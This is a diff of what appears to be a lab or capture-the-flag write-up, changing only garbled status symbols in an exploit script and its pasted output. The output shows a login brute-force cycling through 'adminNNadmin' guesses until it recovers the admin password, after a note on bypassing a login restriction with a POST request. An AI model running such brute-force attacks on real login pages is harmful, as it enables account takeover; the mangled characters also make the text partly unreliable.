@@ -202,9 +202,9 @@ def main():
 
  # Check for failure messages
  if "Please enter valid login details" in body or "Too many failed" in body:
- print("âœ—")
+ print("â—")
  else:
- print("âœ… SUCCESS!")
+ print("â… SUCCESS!")
  print(f" â†’ admin password is: {trypass}")
  return
 
@@ -219,51 +219,51 @@ The script allows us to bypass the restriction by doing a `POST` request to our 
 
 ```python
 python3 exploit.py
-[+] Trying admin00admin¦ âœ—
-[+] Trying admin01admin¦ âœ—
-[+] Trying admin02admin¦ âœ—
-[+] Trying admin03admin¦ âœ—
-[+] Trying admin04admin¦ âœ—
-[+] Trying admin05admin¦ âœ—
-[+] Trying admin06admin¦ âœ—
-[+] Trying admin07admin¦ âœ—
-[+] Trying admin08admin¦ âœ—
-[+] Trying admin09admin¦ âœ—
-[+] Trying admin10admin¦ âœ—
-[+] Trying admin11admin¦ âœ—
-[+] Trying admin12admin¦ âœ—
-[+] Trying admin13admin¦ âœ—
-[+] Trying admin14admin¦ âœ—
-[+] Trying admin15admin¦ âœ—
-[+] Trying admin16admin¦ âœ—
-[+] Trying admin17admin¦ âœ—
-[+] Trying admin18admin¦ âœ—
-[+] Trying admin19admin¦ âœ—
-[+] Trying admin20admin¦ âœ—
-[+] Trying admin21admin¦ âœ—
-[+] Trying admin22admin¦ âœ—
-[+] Trying admin23admin¦ âœ—
-[+] Trying admin24admin¦ âœ—
-[+] Trying admin25admin¦ âœ—
-[+] Trying admin26admin¦ âœ—
-[+] Trying admin27admin¦ âœ—
-[+] Trying admin28admin¦ âœ—
-[+] Trying admin29admin¦ âœ—
-[+] Trying admin30admin¦ âœ—
-[+] Trying admin31admin¦ âœ—
-[+] Trying admin32admin¦ âœ—
-[+] Trying admin33admin¦ âœ—
-[+] Trying admin34admin¦ âœ—
-[+] Trying admin35admin¦ âœ—
-[+] Trying admin36admin¦ âœ—
-[+] Trying admin37admin¦ âœ—
-[+] Trying admin38admin¦ âœ—
-[+] Trying admin39admin¦ âœ—
-[+] Trying admin40admin¦ âœ—
-[+] Trying admin41admin¦ âœ—
-[+] Trying admin42admin¦ âœ—
-[+] Trying admin43admin¦ âœ—
-[+] Trying admin44admin¦ âœ… SUCCESS!
+[+] Trying admin00admin¦ â—
+[+] Trying admin01admin¦ â—
+[+] Trying admin02admin¦ â—
+[+] Trying admin03admin¦ â—
+[+] Trying admin04admin¦ â—
+[+] Trying admin05admin¦ â—
+[+] Trying admin06admin¦ â—
+[+] Trying admin07admin¦ â—
+[+] Trying admin08admin¦ â—
+[+] Trying admin09admin¦ â—
+[+] Trying admin10admin¦ â—
+[+] Trying admin11admin¦ â—
+[+] Trying admin12admin¦ â—
+[+] Trying admin13admin¦ â—
+[+] Trying admin14admin¦ â—
+[+] Trying admin15admin¦ â—
+[+] Trying admin16admin¦ â—
+[+] Trying admin17admin¦ â—
+[+] Trying admin18admin¦ â—
+[+] Trying admin19admin¦ â—
+[+] Trying admin20admin¦ â—
+[+] Trying admin21admin¦ â—
+[+] Trying admin22admin¦ â—
+[+] Trying admin23admin¦ â—
+[+] Trying admin24admin¦ â—
+[+] Trying admin25admin¦ â—
+[+] Trying admin26admin¦ â—
+[+] Trying admin27admin¦ â—
+[+] Trying admin28admin¦ â—
+[+] Trying admin29admin¦ â—
+[+] Trying admin30admin¦ â—
+[+] Trying admin31admin¦ â—
+[+] Trying admin32admin¦ â—
+[+] Trying admin33admin¦ â—
+[+] Trying admin34admin¦ â—
+[+] Trying admin35admin¦ â—
+[+] Trying admin36admin¦ â—
+[+] Trying admin37admin¦ â—
+[+] Trying admin38admin¦ â—
+[+] Trying admin39admin¦ â—
+[+] Trying admin40admin¦ â—
+[+] Trying admin41admin¦ â—
+[+] Trying admin42admin¦ â—
+[+] Trying admin43admin¦ â—
+[+] Trying admin44admin¦ â… SUCCESS!
  â†’ admin password is: admin44admin
 ```
 
